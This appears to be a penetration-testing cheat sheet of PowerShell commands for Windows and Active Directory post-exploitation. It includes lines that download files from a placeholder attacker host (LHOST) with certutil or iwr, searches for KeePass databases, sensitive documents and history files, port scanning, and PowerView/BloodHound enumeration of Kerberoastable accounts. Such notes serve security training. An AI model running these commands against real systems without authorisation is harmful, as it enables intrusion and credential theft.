
powershell
Find KDBX files in Windows:Get-ChildItem -Path C:\\ -Include .kdbx -File -Recurse -ErrorAction SilentlyContinue
Download file (Invoke-WebRequest):powershell -command Invoke-WebRequest -Uri http://\<LHOST\>:\<LPORT\>/\<FILE\> -Outfile C:\\temp\<FILE\>
Download file (iwr alias):iwr -uri http://lhost/file -Outfile file
Download file (certutil):certutil -urlcache -split -f "http://\<LHOST\>/\<FILE\>" \<FILE\>
Test network connection to port:Test-NetConnection -Port \<port\> \<IP\>
Scan first 1024 ports:1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $*)) "TCP port $_ is open"} 2>$null
View current user's groups:whoami /groups
View all privileges and info:whoami /all
Start a service:Start-Service \<service\>
Stop a service:Stop-Service \<service\>
Restart a service:Restart-Service \<service\>
View command history:Get-History
View history save path:(Get-PSReadlineOption).HistorySavePath
View history file content:type C:\\Users\\sathvik\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt
View installed executables (32-bit):Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\*" | select displayname
View installed executables (64-bit):Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\*" | select displayname
List running processes:Get-Process
List running processes with path:Get-Process | Select ProcessName,Path
Find sensitive files in XAMPP:Get-ChildItem -Path C:\\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue
Find sensitive files for user:Get-ChildItem -Path C:\\Users\\dave\\ -Include .txt,.pdf,.xls,.xlsx,.doc,\*.docx -File -Recurse -ErrorAction SilentlyContinue
List running services:Get-CimInstance -ClassName win32\_service | Select Name,State,PathName | Where-Object {$*.State -like 'Running'}
Find KDBX files (PowerShell):Get-ChildItem -Recurse -Filter \*.kdbx
View PowerShell history file:type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt
Load PowerView module:Import-Module .\\PowerView.ps1
Get basic domain info (PowerView):Get-NetDomain
List all domain users (PowerView):Get-NetUser
Enumerate domain groups (PowerView):Get-NetGroup
Get info for specific group (PowerView):Get-NetGroup "group name"
Enumerate domain computers (PowerView):Get-NetComputer
Find local admin access (PowerView):Find-LocalAdminAccess
Check logged on users (PowerView):Get-NetSession -ComputerName files04 -Verbose
List SPN accounts (PowerView):Get-NetUser -SPN | select samaccountname,serviceprincipalname
Enumerate object ACLs (PowerView):Get-ObjectAcl -Identity \_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Find domain shares (PowerView):Find-DomainShare
Find AS-REP roastable accounts (PowerView):Get-DomainUser -PreauthNotRequired -verbose
Find Kerberoastable accounts (PowerView):Get-NetUser -SPN | select serviceprincipalname
Load SharpHound module:Import-Module .\\Sharphound.ps1
Invoke BloodHound collector:Invoke-BloodHound -CollectionMethod All -OutputDirectory \<location\> -OutputPrefix "name"
Check user SID:whoami /user
Check Kerberos tickets:klist
Access service with default credentials:iwr -UseDefaultCredentials \<servicename\>://\<computername\>
